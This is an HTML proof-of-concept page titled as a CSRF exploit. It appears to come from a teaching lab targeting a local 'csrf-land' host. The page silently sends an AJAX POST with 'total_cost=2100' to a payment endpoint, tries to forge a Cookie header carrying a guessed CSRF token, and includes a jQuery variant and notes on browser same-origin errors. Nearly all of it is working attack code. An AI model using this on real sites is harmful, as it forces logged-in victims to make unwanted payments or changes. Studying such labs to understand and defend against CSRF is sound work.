<!DOCTYPE html>
<html>
<head>
	<meta name="author" content="Pichaya Morimoto">
	<title>CSRF Exploit - HTTP POST using AJAX</title>
	<script src="../assets/js/jquery.min.js"></script>
</head>
<body>
<!--
This Should Works Only Same Origin by default
Otherwise,

FireFox 32
Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at http://target.website/post/payment.php. This can be fixed by moving the resource to the same domain or enabling CORS.

Chrome 37
XMLHttpRequest cannot load http://target.website/post/payment.php. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://attacker.website' is therefore not allowed access. 

+
Refused to set unsafe header "Content-length"
Refused to set unsafe header "Connection" 

-->
<img src="longcat.jpg">
<script type="text/javascript">
/* JQuery Style
	$(function(){
		$.ajax({
	           type: "POST",
	           url: "http://csrf-land.local/post/payment.php",
	           data: "total_cost=2100"
			});
	});
Native AJAX
*/
var http = new XMLHttpRequest();
var url = "http://csrf-land.local/post/payment.php";
var params = "total_cost=2100";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.setRequestHeader("Content-length", params.length);
http.setRequestHeader("Connection", "close");
http.setRequestHeader("Cookie", "csrf_token=CI_IS_PROBABLY_SAFE;");
http.send(params);
</script>
</body>
</html>